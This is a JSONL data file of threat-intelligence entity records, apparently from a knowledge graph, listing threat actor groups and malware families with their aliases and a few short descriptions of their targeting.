{"text": " BokBot", "idx": "http://www.bosch.com#node1fvup9pj1x24", "title": "BokBot", "entity": "BokBot", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " BlackMatter", "idx": "http://www.bosch.com#node1fuu313m0x1", "title": "BlackMatter", "entity": "BlackMatter", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " MinerDropper", "idx": "http://www.bosch.com#node1frhbstcrx9", "title": "MinerDropper", "entity": "MinerDropper", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Fancy Bear", "idx": "http://www.bosch.com#node1fvup9pj1x36", "title": "Fancy Bear", "entity": "Fancy Bear", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " DISHCLOTH", "idx": "http://www.bosch.com#node1g4aefeb0x6", "title": "DISHCLOTH", "entity": "DISHCLOTH", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Raccoon stealer", "idx": "http://www.bosch.com#node1fq5p8ki8x4", "title": "Raccoon stealer", "entity": "Raccoon stealer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " ReflectiveGnome", "idx": "http://www.bosch.com#node1g51dalmax11", "title": "ReflectiveGnome", "entity": "ReflectiveGnome", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " LimeRAT", "idx": "http://www.bosch.com#node1fvup9pj1x40", "title": "LimeRAT", "entity": "LimeRAT", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Mimikatz", "idx": "http://www.bosch.com#node1fvup9pj1x47", "title": "Mimikatz", "entity": "Mimikatz", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA574", "idx": "http://www.bosch.com#node1g8ftt36lx1", "title": "TA574", "entity": "TA574", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " Vidar", "idx": "http://www.bosch.com#node1fvup9pj1x20", "title": "Vidar", "entity": "Vidar", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " ProcDump", "idx": "http://www.bosch.com#node1g4aefeb0x4", "title": "ProcDump", "entity": "ProcDump", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " PsiXBot", "idx": "http://www.bosch.com#node1fsmh11c3x19", "title": "PsiXBot", "entity": "PsiXBot", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " M00nD3V", "idx": "http://www.bosch.com#node1fvup9pj1x7", "title": "M00nD3V", "entity": "M00nD3V", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA575", "idx": "http://www.bosch.com#node1g51dalmax4", "title": "TA575", "entity": "TA575", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " RustyBuer", "idx": "http://www.bosch.com#node1g51dalmax13", "title": "RustyBuer", "entity": "RustyBuer", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA453", "idx": "http://www.bosch.com#node1g7env4v1x8", "title": "TA453", "entity": "TA453", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TinyNuke", "idx": "http://www.bosch.com#node1g51dalmax1", "title": "TinyNuke", "entity": "TinyNuke", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " TA547", "idx": "http://www.bosch.com#node1g7env4v1x5", "title": "TA547", "entity": "TA547", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " BlackSoul", "idx": "http://www.bosch.com#node1fsmh11c3x12", "title": "BlackSoul", "entity": "BlackSoul", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " ShinyHunters", "idx": "http://www.bosch.com#node1fvup9pj1x18", "title": "ShinyHunters", "entity": "ShinyHunters", "entity_type": "bosch.com#node", "entity_context": [], "is_subtechnique": false}
{"text": " APT26 APT26 TG-0055 BRONZE EXPRESS Turbine Panda", "idx": "http://www.bosch.com/group/apt26", "title": "APT26", "entity": "APT26", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Evil Eye POISON CARP POISON CARP Earth Empusa", "idx": "http://www.bosch.com/group/poison-carp", "title": "POISON CARP", "entity": "POISON CARP", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Ratpak Spider Ratopak Buhtrap Buhtrap", "idx": "http://www.bosch.com/group/buhtrap", "title": "Buhtrap", "entity": "Buhtrap", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0033 CS0033", "idx": "http://www.bosch.com/software/CS0033", "title": "CS0033", "entity": "CS0033", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Morpho Wild Neutron Butterfly Wild Neutron Jripbot Sphinx Moth ZeroWing", "idx": "http://www.bosch.com/group/wild-neutron", "title": "Wild Neutron", "entity": "Wild Neutron", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0062 CS0062", "idx": "http://www.bosch.com/software/CS0062", "title": "CS0062", "entity": "CS0062", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " SIG27 ItaDuke DarkUniverse DarkUniverse", "idx": "http://www.bosch.com/group/darkuniverse", "title": "DarkUniverse", "entity": "DarkUniverse", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " StealthVector CS0093 StealthMutant CS0093", "idx": "http://www.bosch.com/software/CS0093", "title": "CS0093", "entity": "CS0093", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0082 1xxbot CS0082 ArechClient Asatafar", "idx": "http://www.bosch.com/software/CS0082", "title": "CS0082", "entity": "CS0082", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0026 8.t RoyalRoad CS0026 8.t Builder Royal Road EIGHTFLY", "idx": "http://www.bosch.com/software/CS0026", "title": "CS0026", "entity": "CS0026", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " COPPER Red Beifang Tonto Team LoneRanger Tonto Team CactusPete Earth Akhlut MysticChess Karma Panda BRONZE HUNTLEY", "idx": "http://www.bosch.com/group/tonto-team", "title": "Tonto Team", "entity": "Tonto Team", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Violin Panda Nitro Spindest APT20 th3bug Covert Grove th3bug", "idx": "http://www.bosch.com/group/th3bug", "title": "th3bug", "entity": "th3bug", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Babuk Locker CS0043 CS0043", "idx": "http://www.bosch.com/software/CS0043", "title": "CS0043", "entity": "CS0043", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0049 Ecipekac HEAVYHAND CS0049 SigLoader", "idx": "http://www.bosch.com/software/CS0049", "title": "CS0049", "entity": "CS0049", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Samurai Panda BRONZE EDISON TG-0623 Samurai Panda Sykipot Maverick Panda APT4 Hornet Wisp Team", "idx": "http://www.bosch.com/group/samurai-panda", "title": "Samurai Panda", "entity": "Samurai Panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " GOLD SWATHMORE is a financially motivated cybercriminal threat group that since April 2017 has operated the IcedID (aka BokBot) malware.", "idx": "http://www.bosch.com/group/lunar-spider", "title": "Lunar Spider", "entity": "Lunar Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Goldmouse Golden Hamster APT-C-27 Goldenmouse Goldmouse 黄金鼠 Golden Rat", "idx": "http://www.bosch.com/group/goldmouse", "title": "Goldmouse", "entity": "Goldmouse", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " APT5 has been active since at least 2007. APT5 has targeted or breached organizations across multiple industries, but its focus appears to be on telecommunications and technology companies, especially information about satellite communications. It appears to be a large threat group that consists of several subgroups, often with distinct tactics and infrastructure. The group uses malware with keylogging capabilities to specifically target telecommunication companies' corporate networks, employees and executives.", "idx": "http://www.bosch.com/group/apt5", "title": "APT5", "entity": "APT5", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0053 SoldierTrojan FOCUSFJORD HyperSSL Soldier CS0053 SoldierLoader", "idx": "http://www.bosch.com/software/CS0053", "title": "CS0053", "entity": "CS0053", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0071 CS0071", "idx": "http://www.bosch.com/software/CS0071", "title": "CS0071", "entity": "CS0071", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Stolen Pencil Stolen Pencil G0086", "idx": "http://www.bosch.com/group/stolen-pencil", "title": "Stolen Pencil", "entity": "Stolen Pencil", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0080 CS0080", "idx": "http://www.bosch.com/software/CS0080", "title": "CS0080", "entity": "CS0080", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " JSOUTPROX CS0031 CS0031", "idx": "http://www.bosch.com/software/CS0031", "title": "CS0031", "entity": "CS0031", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0014 CS0014", "idx": "http://www.bosch.com/software/CS0014", "title": "CS0014", "entity": "CS0014", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0087 CS0087", "idx": "http://www.bosch.com/software/CS0087", "title": "CS0087", "entity": "CS0087", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Anchor Panda is an adversary that CrowdStrike has tracked extensively over the last year targeting both civilian and military maritime operations in the green/brown water regions primarily in the area of operations of the South Sea Fleet of the PLA Navy. In addition to maritime operations in this region, Anchor Panda also heavily targeted western companies in the US, Germany, Sweden, the UK, and Australia, and other countries involved in maritime satellite systems, aerospace companies, and defense contractors. Not surprisingly, embassies and diplomatic missions in the region, foreign intelligence services, and foreign governments with space programs were also targeted.", "idx": "http://www.bosch.com/group/anchor-panda", "title": "Anchor Panda", "entity": "Anchor Panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Viceroy Tiger Donot Team Orange Berserker Donot Donot Team OrigamiElephant SectorE02 APT-C-35", "idx": "http://www.bosch.com/group/donot-team", "title": "Donot Team", "entity": "Donot Team", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0048 CS0048", "idx": "http://www.bosch.com/software/CS0048", "title": "CS0048", "entity": "CS0048", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Remote Command Executor CS0091 CS0091", "idx": "http://www.bosch.com/software/CS0091", "title": "CS0091", "entity": "CS0091", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0076 CS0076", "idx": "http://www.bosch.com/software/CS0076", "title": "CS0076", "entity": "CS0076", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0083 CS0083", "idx": "http://www.bosch.com/software/CS0083", "title": "CS0083", "entity": "CS0083", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " PLATINUM TERMINAL Vault 7 Longhorn APT-C-39 UNC1832 Lamberts Longhorn Rattlesnake", "idx": "http://www.bosch.com/group/longhorn", "title": "Longhorn", "entity": "Longhorn", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Dagger Panda TEMP.Trident IceFog Red Wendigo SectorB06 IceFog", "idx": "http://www.bosch.com/group/icefog", "title": "IceFog", "entity": "IceFog", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " S0302 S0302", "idx": "http://www.bosch.com/software/S0302", "title": "S0302", "entity": "S0302", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0004 DopplePaymer CS0004", "idx": "http://www.bosch.com/software/CS0004", "title": "CS0004", "entity": "CS0004", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0081 CS0081", "idx": "http://www.bosch.com/software/CS0081", "title": "CS0081", "entity": "CS0081", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " LYCEUM HEXANE LYCEUM", "idx": "http://www.bosch.com/group/lyceum", "title": "LYCEUM", "entity": "LYCEUM", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " DELoader Terdot CS0056 Silent Night CS0056 ZBot", "idx": "http://www.bosch.com/software/CS0056", "title": "CS0056", "entity": "CS0056", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0029 CS0029 GootLoader GooLoad", "idx": "http://www.bosch.com/software/CS0029", "title": "CS0029", "entity": "CS0029", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0089 CS0089", "idx": "http://www.bosch.com/software/CS0089", "title": "CS0089", "entity": "CS0089", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0012 CS0012", "idx": "http://www.bosch.com/software/CS0012", "title": "CS0012", "entity": "CS0012", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Sea Turtle SeaTurtle Teal Kurma Sea Turtle", "idx": "http://www.bosch.com/group/sea-turtle", "title": "Sea Turtle", "entity": "Sea Turtle", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0011 CS0011", "idx": "http://www.bosch.com/software/CS0011", "title": "CS0011", "entity": "CS0011", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " DNSpionage COBALT EDGEWATER DNSpionage Cold River", "idx": "http://www.bosch.com/group/dnspionage", "title": "DNSpionage", "entity": "DNSpionage", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " dfls DelfsCake CS0050 DARKTOWN CS0050", "idx": "http://www.bosch.com/software/CS0050", "title": "CS0050", "entity": "CS0050", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " MOPSLED CS0092 ScrambleCross CS0092", "idx": "http://www.bosch.com/software/CS0092", "title": "CS0092", "entity": "CS0092", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " SABER LION ZooPark APT-C-38 COBALT JUNO TG-2884 ZooPark", "idx": "http://www.bosch.com/group/zoopark", "title": "ZooPark", "entity": "ZooPark", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0018 CS0018", "idx": "http://www.bosch.com/software/CS0018", "title": "CS0018", "entity": "CS0018", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0088 CS0088", "idx": "http://www.bosch.com/software/CS0088", "title": "CS0088", "entity": "CS0088", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Mythic Leopard TEMP.Lapis Transparent Tribe C-Major Datebug Transparent Tribe ProjectM COPPER FIELDSTONE APT36", "idx": "http://www.bosch.com/group/transparent-tribe", "title": "Transparent Tribe", "entity": "Transparent Tribe", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " TA410 TALONITE TA410", "idx": "http://www.bosch.com/group/ta410", "title": "TA410", "entity": "TA410", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " The Mask Ugly Face Careto Careto", "idx": "http://www.bosch.com/group/careto", "title": "Careto", "entity": "Careto", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " BITTER Meaning Flower 蔓灵花 APT-C-08 Manling Power T-APT-17 BITTER", "idx": "http://www.bosch.com/group/bitter", "title": "BITTER", "entity": "BITTER", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0051 HEAVYPOT GreetCake CS0051", "idx": "http://www.bosch.com/software/CS0051", "title": "CS0051", "entity": "CS0051", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Nightshade Panda Group 27 Nightshade Panda APT9", "idx": "http://www.bosch.com/group/nightshade-panda", "title": "Nightshade Panda", "entity": "Nightshade Panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " ncov CS0065 CS0065 Wadhrama Crysis", "idx": "http://www.bosch.com/software/CS0065", "title": "CS0065", "entity": "CS0065", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " 毒云藤 PoisonVine APT-C-01 Green Spot APT-C-01", "idx": "http://www.bosch.com/group/apt-c-01", "title": "APT-C-01", "entity": "APT-C-01", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " TeleBots TeleBots Sandworm Team", "idx": "http://www.bosch.com/group/telebots", "title": "TeleBots", "entity": "TeleBots", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Infy Prince of Persia Infy", "idx": "http://www.bosch.com/group/infy", "title": "Infy", "entity": "Infy", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Narwhal Spider TA544 GOLD ESSEX TA544", "idx": "http://www.bosch.com/group/ta544", "title": "TA544", "entity": "TA544", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0058 FAKEUPDATES CS0058", "idx": "http://www.bosch.com/software/CS0058", "title": "CS0058", "entity": "CS0058", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0017 CS0017", "idx": "http://www.bosch.com/software/CS0017", "title": "CS0017", "entity": "CS0017", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0068 CS0068 Private Ransomware Builder", "idx": "http://www.bosch.com/software/CS0068", "title": "CS0068", "entity": "CS0068", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0067 CS0067", "idx": "http://www.bosch.com/software/CS0067", "title": "CS0067", "entity": "CS0067", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0009 Ntdsutil.exe CS0009", "idx": "http://www.bosch.com/software/CS0009", "title": "CS0009", "entity": "CS0009", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Emotet, Geodo", "idx": "http://www.bosch.com/group/mummy-spider", "title": "mummy-spider", "entity": "mummy-spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Offwhite Nemty X CS0074 JSWorm Nefilim CS0074", "idx": "http://www.bosch.com/software/CS0074", "title": "CS0074", "entity": "CS0074", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0084 CS0084", "idx": "http://www.bosch.com/software/CS0084", "title": "CS0084", "entity": "CS0084", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Danti Danti DragonOK", "idx": "http://www.bosch.com/group/danti", "title": "Danti", "entity": "Danti", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Corkow Metel Corkow", "idx": "http://www.bosch.com/group/corkow", "title": "Corkow", "entity": "Corkow", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0079 CS0079", "idx": "http://www.bosch.com/software/CS0079", "title": "CS0079", "entity": "CS0079", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0047 CS0047", "idx": "http://www.bosch.com/software/CS0047", "title": "CS0047", "entity": "CS0047", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Stalker Panda BRONZE BUTLER Stalker Panda", "idx": "http://www.bosch.com/group/stalker-panda", "title": "Stalker Panda", "entity": "Stalker Panda", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0077 CS0077", "idx": "http://www.bosch.com/software/CS0077", "title": "CS0077", "entity": "CS0077", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Ciop Cl0p CS0020 CS0020", "idx": "http://www.bosch.com/software/CS0020", "title": "CS0020", "entity": "CS0020", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0075 CS0075 XLoader", "idx": "http://www.bosch.com/software/CS0075", "title": "CS0075", "entity": "CS0075", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " RustyBuer BuerLoader CS0061 CS0061", "idx": "http://www.bosch.com/software/CS0061", "title": "CS0061", "entity": "CS0061", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0073 Zuguo CS0073", "idx": "http://www.bosch.com/software/CS0073", "title": "CS0073", "entity": "CS0073", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Grim Spider Grim Spider GOLD ULRICK", "idx": "http://www.bosch.com/group/grim-spider", "title": "Grim Spider", "entity": "Grim Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Deadeye Jackal Syrian Electronic Army (SEA) Pat Bear APT-C-37 Pai Pai Xiong Deadeye Jackal MoonLight", "idx": "http://www.bosch.com/group/deadeye-jackal", "title": "Deadeye Jackal", "entity": "Deadeye Jackal", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0069 CS0069", "idx": "http://www.bosch.com/software/CS0069", "title": "CS0069", "entity": "CS0069", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0015 CS0015", "idx": "http://www.bosch.com/software/CS0015", "title": "CS0015", "entity": "CS0015", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CARGOCRATE CS0006 CS0006", "idx": "http://www.bosch.com/software/CS0006", "title": "CS0006", "entity": "CS0006", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " csvde.exe CS0008 CS0008", "idx": "http://www.bosch.com/software/CS0008", "title": "CS0008", "entity": "CS0008", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Animal Farm Animal Farm SIG20 SNOWGLOBE", "idx": "http://www.bosch.com/group/animal-farm", "title": "Animal Farm", "entity": "Animal Farm", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0090 CS0090 sqlcmd.exe", "idx": "http://www.bosch.com/software/CS0090", "title": "CS0090", "entity": "CS0090", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0055 fast reverse proxy CS0055", "idx": "http://www.bosch.com/software/CS0055", "title": "CS0055", "entity": "CS0055", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Qbot CS0019 Pinkslipbot CS0019 Quakbot", "idx": "http://www.bosch.com/software/CS0019", "title": "CS0019", "entity": "CS0019", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0023 CS0023", "idx": "http://www.bosch.com/software/CS0023", "title": "CS0023", "entity": "CS0023", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0045 CS0045", "idx": "http://www.bosch.com/software/CS0045", "title": "CS0045", "entity": "CS0045", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0042 CS0042", "idx": "http://www.bosch.com/software/CS0042", "title": "CS0042", "entity": "CS0042", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Clever Kitten Clever Kitten Group 41", "idx": "http://www.bosch.com/group/clever-kitten", "title": "Clever Kitten", "entity": "Clever Kitten", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Anthropoid Spider EmpireMonkey TEMP.Shadow Cobalt Goblin EmpireMonkey", "idx": "http://www.bosch.com/group/empiremonkey", "title": "EmpireMonkey", "entity": "EmpireMonkey", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " S0209 S0209", "idx": "http://www.bosch.com/software/S0209", "title": "S0209", "entity": "S0209", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Dark Seoul Andariel Rifle Silent Chollima Andariel WASSONITE", "idx": "http://www.bosch.com/group/andariel", "title": "Andariel", "entity": "Andariel", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " DustSquad Golden Eagle DustSquad APT-C-34 Golden Falcon Nomadic Octopus", "idx": "http://www.bosch.com/group/dustsquad", "title": "DustSquad", "entity": "DustSquad", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0037 CS0037", "idx": "http://www.bosch.com/software/CS0037", "title": "CS0037", "entity": "CS0037", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " APT-C-50 Domestic Kitten Bouncing Golf Domestic Kitten G0097", "idx": "http://www.bosch.com/group/domestic-kitten", "title": "Domestic Kitten", "entity": "Domestic Kitten", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " the.joker Achilles Achilles", "idx": "http://www.bosch.com/group/achilles", "title": "Achilles", "entity": "Achilles", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " PowerPool IAmTheKing PowerPool", "idx": "http://www.bosch.com/group/powerpool", "title": "PowerPool", "entity": "PowerPool", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " AVE_MARIA CS0013 CS0013", "idx": "http://www.bosch.com/software/CS0013", "title": "CS0013", "entity": "CS0013", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " APT6 APT6 1.php Group", "idx": "http://www.bosch.com/group/apt6", "title": "APT6", "entity": "APT6", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0030 CS0030", "idx": "http://www.bosch.com/software/CS0030", "title": "CS0030", "entity": "CS0030", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Tracer Kitten Volatile Kitten Greenbug Greenbug", "idx": "http://www.bosch.com/group/greenbug", "title": "Greenbug", "entity": "Greenbug", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0028 CS0028", "idx": "http://www.bosch.com/software/CS0028", "title": "CS0028", "entity": "CS0028", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0005 CS0005", "idx": "http://www.bosch.com/software/CS0005", "title": "CS0005", "entity": "CS0005", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " 双尾蝎 Desert Falcons DHS APT-C-23 Desert Falcons Two-tailed Scorpion", "idx": "http://www.bosch.com/group/desert-falcons", "title": "Desert Falcons", "entity": "Desert Falcons", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " ALLANITE Palmetto Fusion ALLANITE", "idx": "http://www.bosch.com/group/allanite", "title": "ALLANITE", "entity": "ALLANITE", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0007 CS0007", "idx": "http://www.bosch.com/software/CS0007", "title": "CS0007", "entity": "CS0007", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " MONTY SPIDER, operator of the CraP2P spam botnet (aka Necurs spambot), appeared to be a clear beneficiary of the Kelihos takedown.", "idx": "http://www.bosch.com/group/monty-spider", "title": "Monty Spider", "entity": "Monty Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0064 BEERBOT BazaBackdoor CS0064", "idx": "http://www.bosch.com/software/CS0064", "title": "CS0064", "entity": "CS0064", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0059 CS0059", "idx": "http://www.bosch.com/software/CS0059", "title": "CS0059", "entity": "CS0059", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0085 CS0085", "idx": "http://www.bosch.com/software/CS0085", "title": "CS0085", "entity": "CS0085", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Roaming Tiger CTG-7273 Roaming Tiger BRONZE WOODLAND Rotten Tomato", "idx": "http://www.bosch.com/group/roaming-tiger", "title": "Roaming Tiger", "entity": "Roaming Tiger", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0041 CS0041", "idx": "http://www.bosch.com/software/CS0041", "title": "CS0041", "entity": "CS0041", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Blue Termite Cloudy Omega Blue Termite", "idx": "http://www.bosch.com/group/blue-termite", "title": "Blue Termite", "entity": "Blue Termite", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Confucius 魔罗桫 Confucius TEMP.Ace", "idx": "http://www.bosch.com/group/confucius", "title": "Confucius", "entity": "Confucius", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Casper LEAD LEAD", "idx": "http://www.bosch.com/group/lead", "title": "LEAD", "entity": "LEAD", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0086 CS0086", "idx": "http://www.bosch.com/software/CS0086", "title": "CS0086", "entity": "CS0086", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0070 Travle CS0070", "idx": "http://www.bosch.com/software/CS0070", "title": "CS0070", "entity": "CS0070", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " Overlord Spider Overlord Spider The Dark Overlord", "idx": "http://www.bosch.com/group/overlord-spider", "title": "Overlord Spider", "entity": "Overlord Spider", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
{"text": " CS0066 CS0066", "idx": "http://www.bosch.com/software/CS0066", "title": "CS0066", "entity": "CS0066", "entity_type": "bosch.com/", "entity_context": [], "is_subtechnique": false}
